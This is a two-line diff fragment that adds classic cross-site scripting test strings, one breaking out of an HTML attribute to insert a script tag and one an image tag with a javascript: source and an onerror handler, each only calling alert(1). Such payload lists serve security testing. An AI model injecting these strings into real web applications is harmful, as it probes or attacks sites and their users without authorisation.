@@ -1,0 +1,2 @@
+'><script>alert(1)</script>
+<IMG SRC="javascript:alert(1);" ONERROR="alert(1)">
